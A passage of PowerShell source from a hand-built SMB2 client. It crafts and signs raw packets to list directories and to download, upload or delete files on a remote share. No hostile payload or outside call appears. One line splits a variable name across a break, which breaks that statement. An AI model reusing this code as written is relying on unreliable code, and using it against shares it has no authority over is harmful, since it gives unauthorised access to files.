                            $stage = 'SetInfoRequest'
                        }
                        elseif($Action -eq 'Get' -and $action_step -ne 1)
                        {

                            switch($action_step)
                            {

                                0
                                {
                                    $file_ID = $client_receive[132..147]
                                    $action_step++
                                    $stage = 'CloseRequest'
                                }

                                2
                                {

                                    if($file_size -lt 4096)
                                    {
                                        $read_request_length = $file_size
                                    }
                                    else
                                    {
                                        $read_request_length = 4096
                                    }

                                    $read_request_offset = 0
                                    $file_ID = $client_receive[132..147]
                                    $action_step++
                                    $stage = 'ReadRequest'
                                }

                                4
                                {
                                    $header_next_command = 0x68,0x00,0x00,0x00
                                    $query_info_request_info_type_1 = 0x01
                                    $query_info_request_file_info_class_1 = 0x07
                                    $query_info_request_output_buffer_length_1 = 0x00,0x10,0x00,0x00
                                    $query_info_request_input_buffer_offset_1 = 0x68,0x00
                                    $query_info_request_buffer_1 = 0
                                    $query_info_request_info_type_2 = 0x01
                                    $query_info_request_file_info_class_2 = 0x16
                                    $query_info_request_output_buffer_length_2 = 0x00,0x10,0x00,0x00
                                    $query_info_request_input_buffer_offset_2 = 0x68,0x00
                                    $query_info_request_buffer_2 = 0
                                    $file_ID = $client_receive[132..147]
                                    $action_step++
                                    $stage = 'QueryInfoRequest'
                                }

                            }

                        }
                        elseif($Action -eq 'Put')
                        {

                            switch($action_step)
                            {

                                0
                                {

                                    if($Action -eq 'Put')
                                    {
                                        $script:sign = '1'
                                        $output_message = "Destination file exists"
                                        $stage = 'CloseRequest'
                                    }

                                }

                                1
                                {
                                    $file_ID = $client_receive[132..147]
                                    $action_step++
                                    $header_next_command = 0x70,0x00,0x00,0x00
                                    $query_info_request_info_type_1 = 0x02
                                    $query_info_request_file_info_class_1 = 0x01
                                    $query_info_request_output_buffer_length_1 = 0x58,0x00,0x00,0x00
                                    $query_info_request_input_buffer_offset_1 = 0x00,0x00
                                    $query_info_request_buffer_1 = 8
                                    $query_info_request_info_type_2 = 0x02
                                    $query_info_request_file_info_class_2 = 0x05
                                    $query_info_request_output_buffer_length_2 = 0x50,0x00,0x00,0x00
                                    $query_info_request_input_buffer_offset_2 = 0x00,0x00
                                    $query_info_request_buffer_2 = 1
                                    $stage = 'QueryInfoRequest'
                                }

                            }

                        }
                        elseif($share_subdirectory_start)
                        {
                            $file_ID = $client_receive[132..147]
                            $stage = 'CloseRequest'
                        }
                        elseif($directory_list.Count -gt 0 -or $action_step -eq 1)
                        {
                            $stage = 'FindRequest'
                        }
                        else
                        {
                            $header_next_command = 0x70,0x00,0x00,0x00
                            $query_info_request_info_type_1 = 0x02
                            $query_info_request_file_info_class_1 = 0x01
                            $query_info_request_output_buffer_length_1 = 0x58,0x00,0x00,0x00
                            $query_info_request_input_buffer_offset_1 = 0x00,0x00
                            $query_info_request_buffer_1 = 8
                            $query_info_request_info_type_2 = 0x02
                            $query_info_request_file_info_class_2 = 0x05
                            $query_info_request_output_buffer_length_2 = 0x50,0x00,0x00,0x00
                            $query_info_request_input_buffer_offset_2 = 0x00,0x00
                            $query_info_request_buffer_2 = 1
                            $file_ID = $client_receive[132..147]
                            $stage = 'QueryInfoRequest'

                            if($share_subdirectory)
                            {
                                $share_subdirectory_start = $true
                            }

                        }

                    }

                    'CreateRequestFindRequest'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2CreateRequest $file 1
                        $packet_SMB2_data["DesiredAccess"] = 0x81,0x00,0x10,0x00
                        $packet_SMB2_data["ShareAccess"] = 0x07,0x00,0x00,0x00
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_SMB2_header["NextCommand"] = [System.BitConverter]::GetBytes($SMB2_header.Length + $SMB2_data.Length)
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data  
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $message_ID++
                        $packet_SMB2b_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2b_header["NextCommand"] = 0x68,0x00,0x00,0x00

                        if($SMB_signing)
                        {
                            $packet_SMB2b_header["Flags"] = 0x0c,0x00,0x00,0x00      
                        }
                        else
                        {
                            $packet_SMB2b_header["Flags"] = 0x04,0x00,0x00,0x00
                        }

                        $packet_SMB2b_data = New-PacketSMB2FindRequestFile 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff 0x00,0x00,0x00,0x00,0x00,0x00
                        $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        $SMB2b_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_data    

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2b_header + $SMB2b_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2b_header["Signature"] = $SMB2_signature
                            $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        }

                        $message_ID++
                        $packet_SMB2c_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        if($SMB_signing)
                        {
                            $packet_SMB2c_header["Flags"] = 0x0c,0x00,0x00,0x00      
                        }
                        else
                        {
                            $packet_SMB2c_header["Flags"] = 0x04,0x00,0x00,0x00
                        }

                        $packet_SMB2c_data = New-PacketSMB2FindRequestFile 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff
                        $packet_SMB2c_data["OutputBufferLength"] = 0x80,0x00,0x00,0x00
                        $SMB2c_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2c_header
                        $SMB2c_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2c_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService ($SMB2_header.Length + $SMB2b_header.Length + $SMB2c_header.Length)  ($SMB2_data.Length + $SMB2b_data.Length + $SMB2c_data.Length)
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2c_header + $SMB2c_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2c_header["Signature"] = $SMB2_signature
                            $SMB2c_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2c_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $SMB2b_header + $SMB2b_data + $SMB2c_header + $SMB2c_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($Action -eq 'Delete')
                        {
                            $stage = 'CreateRequest'
                            $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                            $action_step++
                        }
                        else
                        {
                            $stage = 'ParseDirectoryContents'
                        }

                    }

                    'FindRequest'
                    {
                        $file_ID = $client_receive[132..147]
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_header["NextCommand"] = 0x68,0x00,0x00,0x00
                        $packet_SMB2_data = New-PacketSMB2FindRequestFile $file_ID 0x00,0x00,0x00,0x00,0x00,0x00
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $message_ID++
                        $packet_SMB2b_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        if($SMB_signing)
                        {
                            $packet_SMB2b_header["Flags"] = 0x0c,0x00,0x00,0x00      
                        }
                        else
                        {
                            $packet_SMB2b_header["Flags"] = 0x04,0x00,0x00,0x00
                        }

                        $packet_SMB2b_data = New-PacketSMB2FindRequestFile $file_ID
                        $packet_SMB2b_data["OutputBufferLength"] = 0x80,0x00,0x00,0x00
                        $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        $SMB2b_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService ($SMB2_header.Length + $SMB2b_header.Length)  ($SMB2_data.Length + $SMB2b_data.Length)
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2b_header + $SMB2b_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2b_header["Signature"] = $SMB2_signature
                            $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $SMB2b_header + $SMB2b_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($Action -eq 'Get' -and $action_step -eq 1)
                        {
                            $find_response = [System.BitConverter]::ToString($client_receive)
                            $find_response = $find_response -replace "-",""
                            $file_unicode = [System.BitConverter]::ToString([System.Text.Encoding]::Unicode.GetBytes($source_file))
                            $file_unicode = $file_unicode -replace "-",""
                            $file_size_index = $find_response.IndexOf($file_unicode) - 128
                            $file_size = [System.BitConverter]::ToUInt32($client_receive[($file_size_index / 2)..($file_size_index / 2 + 7)],0)
                            $action_step++
                            $create_request_extra_info = 1
                            $stage = 'CreateRequest'

                            if($share_subdirectory -eq $file)
                            {
                                $file = [System.Text.Encoding]::Unicode.GetBytes($file)
                            }
                            else
                            {
                                $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                            }

                        }
                        else
                        {
                            $stage = 'ParseDirectoryContents'
                        }

                    }

                    'IoctlRequest'
                    {
                        $tree_ID = $client_receive[40..43]
                        $ioctl_path = "\" + $Target + "\" + $Share
                        $ioctl_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($ioctl_path) + 0x00,0x00
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2IoctlRequest $ioctl_path_bytes
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $tree_ID = 0x00,0x00,0x00,0x00
                        $stage = 'TreeConnect'
                    }

                    'Logoff'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2SessionLogoffRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Exit'
                    }

                    'ParseDirectoryContents'
                    {
                        $subdirectory_list = New-Object System.Collections.ArrayList
                        $create_response_file = [System.BitConverter]::ToString($client_receive)
                        $create_response_file = $create_response_file -replace "-",""
                        $directory_contents_mode_list = New-Object System.Collections.ArrayList
                        $directory_contents_create_time_list = New-Object System.Collections.ArrayList
                        $directory_contents_last_write_time_list = New-Object System.Collections.ArrayList
                        $directory_contents_length_list = New-Object System.Collections.ArrayList
                        $directory_contents_name_list = New-Object System.Collections.ArrayList

                        if($directory_list.Count -gt 0)
                        {
                            $create_response_file_index = 152
                            $directory_list.RemoveAt(0) > $null
                        }
                        else
                        {
                            $create_response_file_index = $create_response_file.Substring(10).IndexOf("FE534D42") + 154
                        }

                        do
                        {
                            $SMB_next_offset = [System.BitConverter]::ToUInt32($client_receive[($create_response_file_index / 2 + $SMB_offset)..($create_response_file_index / 2 + 3 + $SMB_offset)],0)
                            $SMB_file_length = [System.BitConverter]::ToUInt32($client_receive[($create_response_file_index / 2 + 40 + $SMB_offset)..($create_response_file_index / 2 + 47 + $SMB_offset)],0)
                            $SMB_file_attributes = [Convert]::ToString($client_receive[($create_response_file_index / 2 + 56 + $SMB_offset)],2).PadLeft(16,'0')

                            if($SMB_file_length -eq 0)
                            {
                                $SMB_file_length = $null
                            }

                            if($SMB_file_attributes.Substring(11,1) -eq '1')
                            {
                                $SMB_file_mode = "d"
                            }
                            else
                            {
                                $SMB_file_mode = "-"
                            }

                            if($SMB_file_attributes.Substring(10,1) -eq '1')
                            {
                                $SMB_file_mode+= "a"
                            }
                            else
                            {
                                $SMB_file_mode+= "-"
                            }

                            if($SMB_file_attributes.Substring(15,1) -eq '1')
                            {
                                $SMB_file_mode+= "r"
                            }
                            else
                            {
                                $SMB_file_mode+= "-"
                            }

                            if($SMB_file_attributes.Substring(14,1) -eq '1')
                            {
                                $SMB_file_mode+= "h"
                            }
                            else
                            {
                                $SMB_file_mode+= "-"
                            }

                            if($SMB_file_attributes.Substring(13,1) -eq '1')
                            {
                                $SMB_file_mode+= "s"
                            }
                            else
                            {
                                $SMB_file_mode+= "-"
                            }

                            $file_create_time = [Datetime]::FromFileTime([System.BitConverter]::ToInt64($client_receive[($create_response_file_index / 2 + 8 + $SMB_offset)..($create_response_file_index / 2 + 15 + $SMB_offset)],0))
                            $file_create_time = Get-Date $file_create_time -format 'M/d/yyyy h:mm tt'
                            $file_last_write_time = [Datetime]::FromFileTime([System.BitConverter]::ToInt64($client_receive[($create_response_file_index / 2 + 24 + $SMB_offset)..($create_response_file_index / 2 + 31 + $SMB_offset)],0))
                            $file_last_write_time = Get-Date $file_last_write_time -format 'M/d/yyyy h:mm tt'
                            $SMB_filename_length = [System.BitConverter]::ToUInt32($client_receive[($create_response_file_index / 2 + 60 + $SMB_offset)..($create_response_file_index / 2 + 63 + $SMB_offset)],0)
                            $SMB_filename_unicode = $client_receive[($create_response_file_index / 2 + 104 + $SMB_offset)..($create_response_file_index / 2 + 104 + $SMB_offset + $SMB_filename_length - 1)]
                            $SMB_filename = [System.BitConverter]::ToString($SMB_filename_unicode)
                            $SMB_filename = $SMB_filename -replace "-00",""

                            if($SMB_filename.Length -gt 2)
                            {
                                $SMB_filename = $SMB_filename.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                $SMB_filename_extract = New-Object System.String ($SMB_filename,0,$SMB_filename.Length)
                            }
                            else
                            {
                                $SMB_filename_extract = [String][Char][System.Convert]::ToInt16($SMB_filename,16)
                            }

                            if(!$Modify)
                            {
                                $file_last_write_time = $file_last_write_time.PadLeft(19,0)
                                [String]$SMB_file_length = $SMB_file_length
                                $SMB_file_length = $SMB_file_length.PadLeft(15,0)
                            }

                            if($SMB_file_attributes.Substring(11,1) -eq '1')
                            {

                                if($SMB_filename_extract -ne '.' -and $SMB_filename_extract -ne '..')
                                {
                                    $subdirectory_list.Add($SMB_filename_unicode) > $null
                                    $directory_contents_name_list.Add($SMB_filename_extract) > $null
                                    $directory_contents_mode_list.Add($SMB_file_mode) > $null
                                    $directory_contents_length_list.Add($SMB_file_length) > $null
                                    $directory_contents_last_write_time_list.Add($file_last_write_time) > $null
                                    $directory_contents_create_time_list.Add($file_create_time) > $null
                                }

                            }
                            else
                            {
                                $directory_contents_name_list.Add($SMB_filename_extract) > $null
                                $directory_contents_mode_list.Add($SMB_file_mode) > $null
                                $directory_contents_length_list.Add($SMB_file_length) > $null
                                $directory_contents_last_write_time_list.Add($file_last_write_time) > $null
                                $directory_contents_create_time_list.Add($file_create_time) > $null
                            }

                            if($share_subdirectory -and !$share_subdirectory_start)
                            {
                                $root_directory_string = $share_subdirectory + '\'
                            }

                            $SMB_offset += $SMB_next_offset
                        }
                        until($SMB_next_offset -eq 0)

                        if($directory_contents_name_list)
                        {

                            if($root_directory_string)
                            {
                                $file_directory = $target_share + "\" + $root_directory_string.Substring(0,$root_directory_string.Length - 1)
                            }
                            else
                            {
                                $file_directory = $target_share
                            }

                        }

                        $directory_contents_output = @()
                        $i = 0

                        ForEach($directory in $directory_contents_name_list)
                        {
                            $directory_object = New-Object PSObject
                            Add-Member -InputObject $directory_object -MemberType NoteProperty -Name Name -Value ($file_directory + "\" + $directory_contents_name_list[$i])
                            Add-Member -InputObject $directory_object -MemberType NoteProperty -Name Mode -Value $directory_contents_mode_list[$i]
                            Add-Member -InputObject $directory_object -MemberType NoteProperty -Name Length -Value $directory_contents_length_list[$i]

                            if($Modify)
                            {
                                Add-Member -InputObject $directory_object -MemberType NoteProperty -Name CreateTime -Value $directory_contents_create_time_list[$i]
                            }

                            Add-Member -InputObject $directory_object -MemberType NoteProperty -Name LastWriteTime -Value $directory_contents_last_write_time_list[$i]
                            $directory_contents_output += $directory_object
                            $i++
                        }

                        if($directory_contents_output -and !$Modify)
                        {

                            if($directory_contents_hide_headers)
                            {
                                ($directory_contents_output | Format-Table -Property @{ Name="Mode"; Expression={$_.Mode }; Alignment="left"; },
                                                                            @{ Name="LastWriteTime"; Expression={$_.LastWriteTime }; Alignment="right"; },
                                                                            @{ Name="Length"; Expression={$_.Length }; Alignment="right"; },
                                                                            @{ Name="Name"; Expression={$_.Name }; Alignment="left"; } -AutoSize -HideTableHeaders -Wrap| Out-String).Trim()
                            }
                            else
                            {
                                $directory_contents_hide_headers = $true
                                ($directory_contents_output | Format-Table -Property @{ Name="Mode"; Expression={$_.Mode }; Alignment="left"; },
                                                                            @{ Name="LastWriteTime"; Expression={$_.LastWriteTime }; Alignment="right"; },
                                                                            @{ Name="Length"; Expression={$_.Length }; Alignment="right"; },
                                                                            @{ Name="Name"; Expression={$_.Name }; Alignment="left"; } -AutoSize -Wrap| Out-String).Trim()
                            }

                        }
                        else
                        {
                            $directory_contents_output
                        }

                        $subdirectory_list.Reverse() > $null

                        ForEach($subdirectory in $subdirectory_list)
                        {  
                            $directory_list.Insert(0,($root_directory + $subdirectory)) > $null
                        }
                        
                        $SMB_offset = 0
                        $stage = 'CloseRequest'
                    }

                    'QueryInfoRequest'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x10,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_header["NextCommand"] = $header_next_command
                        $packet_SMB2_data = New-PacketSMB2QueryInfoRequest $query_info_request_info_type_1 $query_info_request_file_info_class_1 $query_info_request_output_buffer_length_1 $query_info_request_input_buffer_offset_1 $file_ID $query_info_request_buffer_1
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $message_ID++
                        $packet_SMB2b_header = New-PacketSMB2Header 0x10,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        if($SMB_signing)
                        {
                            $packet_SMB2b_header["Flags"] = 0x0c,0x00,0x00,0x00      
                        }
                        else
                        {
                            $packet_SMB2b_header["Flags"] = 0x04,0x00,0x00,0x00
                        }

                        $packet_SMB2b_data = New-PacketSMB2QueryInfoRequest $query_info_request_info_type_2 $query_info_request_file_info_class_2 $query_info_request_output_buffer_length_2 $query_info_request_input_buffer_offset_2 $file_ID $query_info_request_buffer_
2
                        $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        $SMB2b_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService ($SMB2_header.Length + $SMB2b_header.Length)  ($SMB2_data.Length + $SMB2b_data.Length)
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2b_header + $SMB2b_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2b_header["Signature"] = $SMB2_signature
                            $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $SMB2b_header + $SMB2b_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($share_subdirectory_start)
                        {
                            $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                            $root_directory = $file + 0x5c,0x00
                            $create_request_extra_info = 1
                            $stage = 'CreateRequest'
                        }
                        elseif($Action -eq 'Get')
                        {

                            switch($action_step)
                            {

                                5
                                {
                                    $query_info_response = [System.BitConverter]::ToString($client_receive)
                                    $query_info_response = $query_info_response -replace "-",""
                                    $file_stream_size_index = $query_info_response.Substring(10).IndexOf("FE534D42") + 170
                                    $file_stream_size = [System.BitConverter]::ToUInt32($client_receive[($file_stream_size_index / 2)..($file_stream_size_index / 2 + 8)],0)
                                    $file_stream_size_quotient = [Math]::Truncate($file_stream_size / 65536)
                                    $file_stream_size_remainder = $file_stream_size % 65536
                                    $percent_complete = $file_stream_size_quotient

                                    if($file_stream_size_remainder -ne 0)
                                    {
                                        $percent_complete++
                                    }
                                    
                                    if($file_stream_size -lt 1024)
                                    {
                                        $progress_file_size = "" + $file_stream_size + "B"
                                    }
                                    elseif($file_stream_size -lt 1024000)
                                    {
                                        $progress_file_size = "" + ($file_stream_size / 1024).ToString('.00') + "KB"
                                    }
                                    else
                                    {
                                        $progress_file_size = "" + ($file_stream_size / 1024000).ToString('.00') + "MB"
                                    }

                                    $header_next_command = 0x70,0x00,0x00,0x00
                                    $query_info_request_info_type_1 = 0x02
                                    $query_info_request_file_info_class_1 = 0x01
                                    $query_info_request_output_buffer_length_1 = 0x58,0x00,0x00,0x00
                                    $query_info_request_input_buffer_offset_1 = 0x00,0x00
                                    $query_info_request_buffer_1 = 8
                                    $query_info_request_info_type_2 = 0x02
                                    $query_info_request_file_info_class_2 = 0x05
                                    $query_info_request_output_buffer_length_2 = 0x50,0x00,0x00,0x00
                                    $query_info_request_input_buffer_offset_2 = 0x00,0x00
                                    $query_info_request_buffer_2 = 1
                                    $action_step++
                                    $stage = 'QueryInfoRequest'
                                }

                                6
                                {

                                    if($file_stream_size -lt 65536)
                                    {
                                        $read_request_length = $file_stream_size
                                    }
                                    else
                                    {
                                        $read_request_length = 65536
                                    }

                                    $read_request_offset = 0
                                    $read_request_step = 1
                                    $action_step++
                                    $stage = 'ReadRequest'
                                }

                            }
                        }
                        elseif($Action -eq 'Put')
                        {
                            $percent_complete = $source_file_size_quotient

                            if($source_file_size_remainder -ne 0)
                            {
                                $percent_complete++
                            }

                            if($source_file_size -lt 1024)
                            {
                                $progress_file_size = "" + $source_file_size + "B"
                            }
                            elseif($source_file_size -lt 1024000)
                            {
                                $progress_file_size = "" + ($source_file_size / 1024).ToString('.00') + "KB"
                            }
                            else
                            {
                                $progress_file_size = "" + ($source_file_size / 1024000).ToString('.00') + "MB"
                            }

                            $action_step++
                            $set_info_request_file_info_class = 0x01
                            $set_info_request_info_level = 0x14
                            $set_info_request_buffer = [System.BitConverter]::GetBytes($source_file_size)
                            $stage = 'SetInfoRequest'
                        }
                        elseif($Action -eq 'Delete')
                        {
                            $stage = 'CreateRequest'
                        }
                        else
                        {
                            $stage = 'CreateRequestFindRequest'
                        }

                    }

                    'ReadRequest'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2ReadRequest $read_request_length $read_request_offset $file_ID
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        Start-Sleep -m 5

                        if($read_request_length -eq 65536)
                        {
                            $i = 0

                            while($client.Available -lt 8192 -and $i -lt 10)
                            {
                                Start-Sleep -m $Sleep
                                $i++
                            }

                        }
                        else
                        {
                            Start-Sleep -m $Sleep
                        }
                        
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($Action -eq 'Get' -and $action_step -eq 3)
                        {
                            $action_step++
                            $create_request_extra_info = 1
                            $stage = 'CreateRequest'
                        }
                        elseif($Action -eq 'Get' -and $action_step -eq 7)
                        {

                            if(!$NoProgress)
                            {
                                $percent_complete_calculation = [Math]::Truncate($read_request_step / $percent_complete * 100)
                                Write-Progress -Activity "Downloading $source_file - $progress_file_size" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation
                            }

                            $file_bytes = $client_receive[84..($read_request_length + 83)]
    
                            if(!$Modify)
                            {

                                if(!$file_write)
                                {
                                    $file_write = New-Object 'System.IO.FileStream' $destination_path,'Append','Write','Read'
                                }

                                $file_write.Write($file_bytes,0,$file_bytes.Count)
                            }
                            else
                            {
                                $file_memory.AddRange($file_bytes)
                            }

                            if($read_request_step -lt $file_stream_size_quotient)
                            {
                                $read_request_offset+=65536
                                $read_request_step++
                                $stage = 'ReadRequest'
                            }
                            elseif($read_request_step -eq $file_stream_size_quotient -and $file_stream_size_remainder -ne 0)
                            {
                                $read_request_length = $file_stream_size_remainder
                                $read_request_offset+=65536
                                $read_request_step++
                                $stage = 'ReadRequest'
                            }
                            else
                            {

                                if(!$Modify)
                                {
                                    $file_write.Close()
                                }
                                else
                                {
                                    [Byte[]]$file_memory = $file_memory
                                    ,$file_memory
                                }

                                $output_message = "[+] File downloaded"
                                $stage = 'CloseRequest'
                            }
                            
                        }
                        elseif([System.BitConverter]::ToString($client_receive[12..15]) -ne '03-01-00-00')
                        {
                            $stage = 'CloseRequest'
                        }
                        else
                        {
                            $stage = 'CloseRequest'
                        }

                    }

                    'SetInfoRequest'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x11,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
